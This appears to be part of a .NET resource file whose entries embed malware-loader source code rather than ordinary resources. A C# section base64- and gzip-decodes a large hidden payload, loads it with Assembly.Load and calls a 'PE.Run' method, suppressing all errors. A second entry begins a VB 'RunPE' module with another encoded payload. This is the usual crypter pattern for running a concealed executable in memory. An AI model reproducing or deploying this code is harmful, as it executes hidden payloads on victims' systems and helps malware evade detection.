"enl3bt3ry6Unict9NzTnwA9z6oXwLf46s3T11dk2/a+zF7vPGN/+urtq6evMhnHT1TkMzffznfAxD9x8eYniY9P9s+ekX2693t/g" + "amh72eGNl+cfLvBW6dnz548o5/rkye/z5unL3a/Qr/f3nlzcffi4MU5u50/8dW3r37RC8gz0erL05/Y/67I7i/6ArbsODt79XQ+f" + "Urj/PLzb+/vhfTY/6l+2+q7P81xIH8/+by6eqB0+vLb/fdn/ff3vyO6zP/s4DunF28upjtfhJ8vDsC4n3+Z7cNGvX4yP3u2fzIHL" + "cj2XH7y7BUGdfb65Br24PT4/LusR16dkAyeXwAH4okzwxMHr8hffP3k221xDP6zOB783qcXP93ve0/6/s5yHyr79NmTtaHhT5y+O" + "v7u6cWrB7/PTzCfGN76iWfvzs7ye+yv5d91/PMTnz85+/b+t18w3rbfV8c/5dHuJz4nGXHfPTEy8erJq2p9cu/3+mnWwztAYPXpO" + "YdkNLZ9Hdu701enr3hszJMOzunvffJtI7949/UXX+IHje/01cXZ+ckZBvQAOtzj91efvxaH4qefWjjZt3dOvvhSaXP6XaHN73XK9"
   + "vnNCXnfYT+v1r/X6e+D76pXV2wfnk/bKdubV8dsb06etF9UX6LD+Re/1zm7bv54qI95bDxnv/fpTyzsHJ3OL16d/CL8fDs0ltchX" + "b+jdP2pT04IzSdPfmLy0xzPnL4hGr55Nj87zffw92vXx7vp65Nvt/BNTr9dFo5+7y5en+RPfgCb4+mXN5+/+kWOTu+qV0+874weO" + "b0gvF/PgfDv5eiGfim++r1Bt1efgFkIv9/H4PfsyelXgh9ec/g9e0L4fdnD4yvT1/kFfFNPDt599erZq4gcvPrq9+7K6jOdZ4pn0" + "R5+xuk5JpDi69OrH+RPXlFsT77h6U9c/SJ8egz/48UO/4rn89/77Pc+/gni258+fUIS+vv8XtxXxn7hkyfl9RvyX8nH+Gm0+fzkA" + "riTOwLd8BM/NZ1PnyA/gPFPyeEATk8q9mtOP/+9v/OS4f6iJoArc2rgPv/JEG4lcN8eMNy7IdznAdyCfGYPrsyFxfc7xxc+3J0A7" + "k9RbseD+yXD/fbvNcE70/o0hIs2yMHQv1/trE5Iv2CO8LA/P/vps/UXJ/u7XzydXsOfpefZ8ef8yxkm5uzePpz4n4DlPqV/z3Zf7" + "EwX5fqnWAeR6YRMfMH5s5/+yZ/84vghE4i/+ulXuz/5HZ7K458gv/PJ74M5Odv5TjNh/tIHauYnzx9W73a+w7+/rEryt797rFDQ8" + "/ETzBcL3zH84eNT2OIn7Iqzr88+tPaK9sf4XnJ6T/nvM/vPCQ8NIzuGTdOX+O8T+xv+uLB0+pzyeid3L07p55X8PLk4+TblnyjvK" + "3+fVvLz2VTbXTzl75/u0M8vPj/+8hQ/fy/6+/Ts4id+r+PTr/CT2p+d8vef/8Rzfu/p6Rf8NzlI/PPZmfz8vJGfv9fZF2/Jvzx+/" + "lZ+vvh95OfLr+Tn8f4L/nkylZ+nZ/Lz2Y78/Pbv84LhkLvAP79zIZ8/P5WfX1YvfnCxQ3B+ny/5J8Ugz37i06fERF8yHT5vvnx9t" + "U/v68/nx/Lzi+ZLxv/Lr/RnJT9fXsnP4y9e8s8nv89LHZ/8/Uw//7b5eSE/v3Ml7X4vbndJ8F/KPFQ/Ie+d6c+38vNMP/8OOfig8" + "/Pf5yeYzl+e/cSznyD8jqevBI99+fnk95GfT09fCT5T+fns7BWP53P9+9tX8vfv9dWr8pVyxk8oV7AcnYJfOK/5RP8+hi7lBADii" + "VPw5xN88+oKyacdvPdtee9Joe89ZdbmOPtA3/t9oCz4vSW/9xVAXsl7LNh4j/D/iviZpPKLM3z0iozSMdmF1/Tb8S74/Mkp4u8HR" + "Df67SnsHGT4/JhsLr/3cirvEefTe78X3jsBztSa8jf6HimRn+D3fhG/d3EKjJ/we6eVfe/VT8h7FO7qe0++K+89Obfvfb4j733u+" + "pvre7+PxfPkp/S90r73e53Ke9/et++1iufc4vn0tbxHxIRP8RNPHhz/9Bf4OT3+AX4+nR4f/D74+YNjpJ9+4un+8cEO2mdPTt5SB" + "u9kpT8/kZ9PX+jPQn/uyc/j7zx5zT+n+rOWn0+e4Sf55fmTN6Snf+LpmydfTZ989fvQez9Jqv3i+Msn5QV+vnlSXuHn7/Pkpw/wc" + "6k/d+Xnk8/150R/Xj1Z4P2TU/2p751U+nNffj6l77/Az+/q3xdPFr8PftZPFhV+firvUyy3xz/fPPkB9zvXn3vyk/rf036o/Ve/D" + "+Gxi7+fHOjn9D76OflJ/VnJeyc/kJ9Pv6M/Fe7TXYV/fPKUfz7Xnz+pPxf6c+fkc+7nJ/Rnoz8/kZ8n+vnJQn8eyHtPv9Sfmf6s9Oc7aff0gfw8/vLkjYxXf/5Afj55pj+/qz8L/bl38ntjfGaeTr4jn598efJd7v+7+nOmPwv9udKfP9Cfn8jPp9/Rn/r+0zf6M9Of5" + "/rzrf5s9efOye89xc9P5W9aQpN5/OKE1hwwjyd2/o+9n8fTk+b3gd4o9Wcr7Y7vy88np/rzlf78Sf35U/pzpj/n+rPUn6uTJf/8g"
   + "f5t4N2VnyfP9Odz/flSfyqeJ7+3/pzoz3P9+dP6c6k/a/35Tn/u688DHe/JScX8/pX+faE/9b2nit9TxYtclR/wz99Hf5Yn+6Dr8" + "bX8beWHf37F3sDxcUn0OkYK7SeeNKxlj08+/5ymhLWgPE8p/fX7vPyJs590KdIvjt9dPHtKuTBNLdFz9fTz4+9+dUL5iW/b9774f" + "Z5Mf+KsPT5ujmfa3/yiODn+6SlU7IH29+TkbOfkJYCefcWGhfo7W5BnBnvy06/1vfnFw+O3pPp+4qSS955+fvJ7vT15jbzr79XIe" + "1/8PmftT3yHvt4/rgt5793FT58cv704Juq9s+99sX/yBu89v7Dv7f3Ed77Aez9QPOm9xTF5dU+J7ua945dfnPzkT2DZ9ifY1tB7x" + "5/8xHdmsEvPX4v9fHfx9BO89+wnjnfOfkLfe/LF05/6iePvHn++PzfvkVPxCkw7PZH35jSfx4sr+vzkO/LeCfc3/QnKM/9eZ9Lf2" + "e9zfHD1nT04xetr771lQy7t06/892hg0+MX+957v9ezY1rX+tTvr6rIJXn6zn+PjPE5+aj+ey9hP38vcU/lvdXvc3xG+uKMqUfvn" + "X71dEn8dvx7/T6Fee+rn/gyP+YcBf4+Pn77+uTd8QPKN/6EfERi/urs+f7T9orsLj/UCWUwfvATXz6EE3t1Lf1dvKJ5n58Sczz9Q" + "vt7Qqmzk8+xgvr5VSnwMaY3r44pf74UX5mW5I5fPnnx+xx/cfX04jvcJ733rDnduyKm+r0uFtzoO7/P8eXFyyuaZEr+/D78EZmw1" + "ZOXv4/44XiuRB5oPj/RT5ivKf385Fi6OlZ5KI8vvrLiwPLwe5+ePP+JJ8pRGN/vczE9/okXx1/RuqPShvq7SzEqpY2f7CDPRu2+S" + "3IA549Y5Cc4Rwo8f/qKMrZfvT1+cS2IsTzM2R+5+3sJ/M9Pnh0/e/4Tz74gf6/ij85Oz37vn/jq+pjS8l+deO/99NmTN7SyY947/" + "rx69uUx/ne1kvd+H5qUnzw5/uqAFup2+KO3ry5+0enrn+DVBPhpLzk3dEbxS8N/v9K/3+jfP3ksf//eV7G/vzjO+e+f0PdOab7kZ" + "3EsP2V93/390wq//Al5f3nD5+a9Sr//RYqH+fzDfp4dN4q3+bvlv7+wn1/+hP95/+8rHe8PFL9d/XzvSv7eVzp9qnQ6iNLx9Pih/" + "vxEf97V958imUHvP+OfP2HbfZsDyjNywq/47wNeJyD9pe0Jj584PQazf8Hfd+c11/79eTs75ueJwK9OGL+LK20v/QmdvtBxuc/Pj" + "6Vf87mh84XiV/yE/PyJn2hXx2yXnrzDz5IygvL3yXf05yv8XP7E5z+lP+f6c6U/3+nP+/Lz20/053f0J79fXXxb3/+2vv9tff/b/" + "P7qinz1NzsnNTKY9LO4IP38hu2l4nE8179/Sv9e2b9fvIXduY+/L69Of+r4y9+HtNUTWr6h3OxPPKPo7uLlu594Rr711cvrq2cMf" + "/kTp18onK/059T9/H0o13I6JfK8/PT42U8df0Vx5E88mx//5MFLotNPHX93+vLBTzxbHf8+1cuDq2f3j7Odl3dJeVJc/fLJxdnb4" + "y9/Au/dh8Z/dkV/v7x6+RrBmHzf6PdkC776Ceqvke+JztTPT1595/7xq7OfaMg/On79+8jPN2/xk/DY+Yl3F9TuJw9+4qd+4mxK8" + "eZPZBfU/rtXPzE9/s78+Ds7PzG7op+/1xek1M6+Ov5iSgb17Av5Setl04OfWFx858nxrPkJSlethA40X3n1EzUtpxyfQxl+h+n+E" + "/Bf+PtnPN5P8TmPm36+unpFcPjvg4vnPC+/1/HLd/j5/Oolv1cgD/LTOn/y8+yYFmW/ujolY3VxPLmgny+/On57fLqk/AClYU/Xx" + "99pSB9/RT+/IHtIP4mkX/wE/fy9vjheHNNPCmG/g7+f6ucUr/HPZ/qThprz3zQVgHOq7T/X77/9xfGbq598cvz8i2Ms2cN/op8X8"
     + "jf9OcHPZz99/N0vTvgn/306P67550/bnwv+/qn9yZ/TfJZfnLy4eql/f1u//7a2/7Z5/y2tNdLPzy+eSLtj+fnsycnuFyeLn/hyj" + "p936edT+vn7/MRrWlX74uTq6vW3iT5PTpDPeD59ZvIJJy4v93vx3/xrY/MNT02qilJukHd59t33V/Z7/oTff8Lt2CSdunzWG/v+k" + "5+w7z/DT86IkR/Gz5nm3dBuR3/uU9xN+oE8uu8cf2dKk3ny9vj3qo7rnzhZHz9/etyenTy8OjsFfFZy9MyOv2QfJL+Sn8Xxl78IP" + "9/qT6IT/6x+4ss1fv6iY/n54Cd+8vnxT5zRigSGzvCeAiTR6Rn/vIIffYYPvyP6HCmTM7gqTB9C4iX/fSU/X/wEsgaUOr5AvuPty" + "92f+PbkOD9DpmNKyvTJq58g/wu8c/zs28fkdzFdyJ/4wU98Qf4UZYwoZ8u/8KgM/d3zi36C5sJoevuQ/fkJbWv8JfP8BPnBP8G/f" + "Y4pOoFcUf74hMfxVgZLrthT+OGk62kcX2IGTzjPw/NJHMOJ168A/Bn035PfBz9/bxN0vDzdvfypb/9k81Nv9o+/Wv7k+qvTr66fL" + "141E2rw6ieevCR1tPfiKf7/4vzF099n54sf/D4/4J+7Bzsv3vzED1684c92vtj7qbc/Rf/PTmefvzpdPX9zOjs7fvaT6+nes8VP/" + "STywT85n/zEkzf57/1i56e+u7N+s3i2k/3eP1Uenz788ifw/g+OqY8vuJ8vn77defHTP3H/i6df7L/46bf79rNy/vSrHVoWOp2dv" + "npLjttpuZ4tHtY/9Xt/5/Snvvuu/Km9Zzs/9RNPvvx9fu9Xq9niJ8/os6uf+r3PZFyfP7yeff6smHz+k8/yz3/yp2e/96v577N4R" + "/2XL37iq9mz33v3xbOf2H31nTc7989fn/7kk1enP/n6+HR3Nd178ZOTRXk5uTg+IJzbn3pzv/y9dx9+nv3e8/KnTr+z+1OLnyqnP" + "00rIV/tPnm185Pnb8pX9v2vrp58581Xz7796icffv76q3fPfu+d+bOfoGWPry7s5y+/esZ9Pnnz7OHZq6+enb76yTML69Xps69+4" + "icfnr7+ye8At5dflW+97x6+cfCOD37qJx9e/9Tv/cUn9PP81aLc/6nvvjqZfZew+73PyOa+K3/ve98ppz84i31/fUxZqTc7L559t" + "fvi/PVX9z9/s/udFz/xk8Br//gndh5++ZOnP/n7UHrq8zenD5/85Gn55avdh29+4id/isbz7PWrr8hwPvsO0b78wezzn7z+id/7O" + "+XvE6XRF8RrP7lPbdY/9flPvv1q8ZPLDLzwe3/nBy8XP3n+e+/81Irm5e1PLH9y8VOLn7x+cfykJdpfThfvVr/PheWb4zd73/lFP" + "/VdWtw53d2dfPvV6vfZe/YD4oaS5nVJ814eP3txf3qP/n59/ztvrp68mX2b8KH3fnLxrJl99ye/yn9vyhk++84uzef697n36nJKc" + "zFZ/tRltvcV0fbZD/Lv3v9pwu0Hs+++oz7k75/Ye9ZMPv/O/PfZa45/Anh/975959V37799/d37e5O9tjz+tuXz5U/93q/O39z7z" + "oroQrboRTl79vAlrYnQu/vHP7X3kzu/N6+RUNuvdsvJdx9e5/oO9bWm/uc/dez+/kmCM/v8K3lv58V8Ur4of+q7jf79rpwsZjuZt" + "ic+/0FG/D/Z2z+ecj9PLqd75U723YdkK2fXGdMINCFlQN+/wXzce1UR3Qhma3Gk78rs6snnk2//5A8ItpVbyNLs87L9qdegwatyu" + "nh4RW2vZ4vyp4n/jn9ibz6fEn6k/n9vgrXzUz+pOuAnnrz+qe8+e/uT373/g9/nuyT3T9+Zvj7Jdh+e/8Ti2U9nRKufIj4guSVX4" + "eF19t3ZanJh5nD3xU99d/dyunx77NHo6e/z3fvSz0/w729+6rs/WR+fWpr8xOTeC6Id5PfJF5O9Z2/ffF4W08Wz65z49hWN/6tvf"
   + "+fy99l59vanqI8prVf95KK8nn2b5uXZk+sJ8dHvc+8njn+f7756S3xC8N81NPfLn9h7SHqH6QC4Pz3Zu793/PmL6vf5vb/z5qd+7" + "584fvPdZ9dTosPk2atL4g3SbWfeZ7o2tvvq8qtvv7r2+PXpZO9dA97GXE2v73/7p757n+hb/jS12fl9vvui/n2eUqz6ebnO9n4S4" + "yB5O353fDp7+vrzZyRT0GW78+mS8Pjuu5e/z2LFuP8EyT3LxWn5g5/ce3jvxU+/+gmaM5qrFz/AZznpcnpPePAned6UzuXTyT3yR" + "09fXNO80TwSPfZeEI1ekIm7v0Pz2P4+v/eT72bf/cl7b/Z+6o3Bm1zo1XT5apdweDL5/B3R9if3uT3z8E9+N/u9v7Mz++6z5s13f" + "7Kd3CN/lr7juXTv2Xl+s3z1beJpost90hPznZ/8fA5c3vI7NHc8D5+TTnn2qpoKP3w5e4Z5/Mn2p37S/+zZLumZ+zQXC+qzhX0gm" + "B4dSM98u7T9ilz95P5PfVW2v893Z6XKL+zGdybffbYkXiOF+dX+l2z/Lq7w84unb/fp/zu/9w8uyG79xO6Ln8bPtztf7NAYFq+WG" + "dtG2C76/8787U8tyD8G7+395A+mOyXZMtL1Oxe7X+Ldp19c/94/ALyvyA4y/L0Xp7PFT32+qn9qD+/Ol69Of6r6qc/pd9L9r0jPv" + "v7u7vyn9r4akCVvLM7efee7b3/y5avy4ZvXpw9f/+QzssNf7T4j2s4n3/2K+LX8we9z9cTO109ABkgvTkmnZr/3qqQ5f/37/N6zU" + "6LlnOzHJckFdPlXk93vzGc7r+azz0+PSRetWEeUxOuLn6Q13RdzlpnlF8F34Gni9d3Jd2nu6Ls3y59sfx+yAeiD8CcaPROZuKK5/" + "O5uQf28/Km371YTyKD8jTmE/M1Jp0NmSDbKn6b2P5F9u/xB9l3SmacxGX+xyhekw8UePiMb0hIeO/Q32RPox3I5IT9lRjbt+PSnV" + "vT9GfgPPsWbe08YJ+JX99l3ie4Yy094eJIuJJzAbz84fkY/v/uToFn51b1X88nvfRzS6B7N0eJh85Psp3zl0+FNTvBIPxAM4PyTN" + "P6HV0xLsmuvPyc+J9tr53bn/k+++eo7z756+/Dz33vn1Xe+evuTT3+S5vi7P/nwGfknr19/9ZNvoCvINv00fmaLh9eqV65/kvoje" + "wG99oLm9HLKdG4JP7LhyxdsV4gun/7UVw8XJH9vaayGH75DfhLR5FmDv3/qVHlA25K+WMW+t3y183BBtnSH9M5PTIh3SQ+d/D6/9" + "wvAJfmH/vrOnOwZjVveE37/SW4D26U0Jp2DOSN9tvwJzGvzU19Rf9+drYnugPni9/nuisb0kPzC74AXSQ+r/v1JNz7i/TXpiZdTo" + "inrisVM7d/ud8FrrOeUboqH/zm1j37O7b+695PF9B77Sm2P1uWL3d9n2cfnJ4keX/zgOxaW+DJfWdqq7Lu/lR+I/59m5Otmuy924" + "XvPvvudHxg/6tXn7xq21aQr4LfBFyM5cfxVis2BL0T97nnz/Ib86J/Odl5cTr67uyKams8hB1eR9vw58Uo7+W5Jtobk+bvE729/q" + "iF9RHKrcv/24eKr5U/Nf4L8KR4H+RKvPn+28/t89WpF/EE4kn36imzognItKrfky0KnrUhPlb/33otiQtEefUYrI/z39eTzL+Tvz" + "59dZ5+Trf38J88JB8gs6aIv5P3fm2wy7BRg3KPxU5vpPYVDdgR/Z7+3/s39vFuQnmmkz4d7k8UBvoPvjZ+XxCOrn+L+H5bo66fc9" + "9L/5z81J7117/jzubM/n8+/yr4tPtlPfXtmP38tf+t3r74Df8fYwleLd/OfIl326ttnV8enr66/+Iknp9OfPsPfP8DfLy7w95Rkg" + "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" + "7h++dHzo+f/Dc//A/KDqLAAWAAA";

    private static void a2(byte[] PE, object[] Params, string Class = "PE", string Method = "Run")
    {
        try
        {
            Assembly a3 = Assembly.Load(PE);
            MethodInfo a4 = a3.GetType(Class).GetMethod(Method);
            a4.Invoke(null, @Params);
        }

        catch
        {
        }
    }
    public static void FuncName(byte[] a4, string a5)
    {
        a2(a6(a1), new object[] { a4, a5 });
    }
    private static byte[] a6(string s)
    {
        return Convert.FromBase64String(a7(s));
    }
    private static string a7(string a8)
    {
        byte[] gzBuffer = Convert.FromBase64String(a8);
        MemoryStream ms = new MemoryStream();
        int msgLength = BitConverter.ToInt32(gzBuffer, 0);
        ms.Write(gzBuffer, 4, gzBuffer.Length - 4);
        byte[] buffer = new byte[(msgLength) - 1 + 1];
        ms.Position = 0;
        GZipStream zip = new GZipStream(ms, CompressionMode.Decompress);
        zip.Read(buffer, 0, buffer.Length);
        return Encoding.UTF8.GetString(buffer);
    }
}</value>
  </data>
  <data name="RunPE2VB" xml:space="preserve">
    <value>Public Module ModuleNAme
    Private RunPE As String = "AFgAAB+LCAAAAAAABADtvQdgHEmWJSYvbcp7f0r1StfgdKEIgGATJNiQQBDswYjN5pLsHWlHIymrKoHKZVZlXWYWQMztnbz33nvvv" &amp; _
        "ffee++997o7nU4n99//P1xmZAFs9s5K2smeIYCqyB8/fnwfPyLe/OQv+onj4y+O6TnFP3fvHhwfP784Ns9P2N9u98ib++fri/3j9" &amp; _
        "nj54mxy8eTNFzvzn/x8vppeP7maLh4up4tn7dnnL+aTxf3L2cmT4qdeP7mefXf/IqP/vzp9+Obs893Ln/r8q/XTn9j5vb5jIT/5i" &amp; _
        "Vc/cXz85vj06fHJwU+8Kr1Ov6T/F6fPj3+iOT5+eoVPTvWb4wdlZdH6ffSzU4Mm/fvEQbHvHB+f2O/l+eL4J86+ksb6wqn+nx8PC" &amp; _
        "D/fmWf04Rv+/fPI9/5zhn+A85OL7/7E8fG3NzS96Tmj/590PjvBB6duPuXD+zs/9XvPd/Drw6eOPi/5y7OwLbc/xjjW0+WL69+HU" &amp; _
        "ZWPfx/X/pP+S0Ks58vvlJPPH/70sTKZgmc0f6L/En/2Ex105Xn6E981n8t4CMZXx09O9o+Pn13VaBB762s9T764Ior8BP9O/57+x" &amp; _
        "Hd+8OIKM1R9frx3cJ8+/fw7RZUfFxc/Sb//Xr/XfP8kvzpD4190dnH29Pwn5PdvX3znAd5/crL6RdT290bb44svKgz+ycXZye91P" &amp; _
        "KXffuqhtKl+r2fX9v/Z9B3GuPr0jYFxfFY9AQ7l29/7u3urVVasPj++0M8uXr757pdPDBzB/+oYuPHMnv7EF6c/ff370B+n1P/kz" &amp; _
        "ZPXFwD++bM14Y7fpP3Mtf/O5ecE66T4fZ4+OTtYoMXJxdnnO1dfVWfoYz65OLn46hd9vvwCQH+vfP37nH7+9IufmF6QRHz7yfW3q" &amp; _
        "c30219k/N3FT7QnP3H2dPKOZPO4qk8vfuL3/uJq/+Q73z34KabH7vzy8ytInOmz+vz3WpwRPSFdP/H0q4uzUn//vXd25zrGVXG8b" &amp; _
        "MBgp8e7X5x85/eW3z9/8eL3Of8JbvuLfh9LtxdfHRc/Kb8/qd9899s73Nbv4yd/wvaRuz6qxfHFy9e/1xMM8ff5Rd+hed15zXP4+" &amp; _
        "e9VnJ0cX1/8Pt7vP8W/10SHk/3TJ0+qH2DMO8XFd/nzi5/4qS+uLtBO3l+eEb+SLnw7Bb1+8DnR/GRZvfmCROQnqW8WlSenRDMIW" &amp; _
        "3X6ez2BqBJfXDREv7OnT/YOctCO5hE/P3/ybvb7nFxNP/9iXZ0Sf/zE8cVPfPeL1z/x7PM3Xzx78mSenR7bsX6XJvIa71iaHL+yN" &amp; _
        "Jtamn1x+ns9hbj+Ppa2T55Z2l8fX5l2P1F9wfxn6Xdq6Usy8Xs9+Qp4/6LjJ83Vk5948m2jb09/7y/Adb/XyfKLOf+890WBn0+Pf" &amp; _
        "+LN03e/z5vTk+a7pz9x8Or0O9WL44uLz59cva1+L/Q3P/2JZ7sXb06fnP7E6U988mX25nnx7av9ycnnB9Avv9d3y4vJd5+0v8/p1" &amp; _
        "U+8evLl00+evvvi2elP/OQPoM2fzL/4/PQnfp/zn/zuAc8J/X5RfELIf37Ac2JgnF5NiVaYhJ+YfHH1+7x68m7+U/TZd0+vLuqz4" &amp; _
        "/kl7NHJ/IvvAFb2uYX16uS7B1P5/eL3/u6TL87o56snP3ieoZ/1Mb6xbU/OWRX+RPUd6uZkIe8RP7NJ+fynv5jyOz8RvkO8s8Tvw" &amp; _
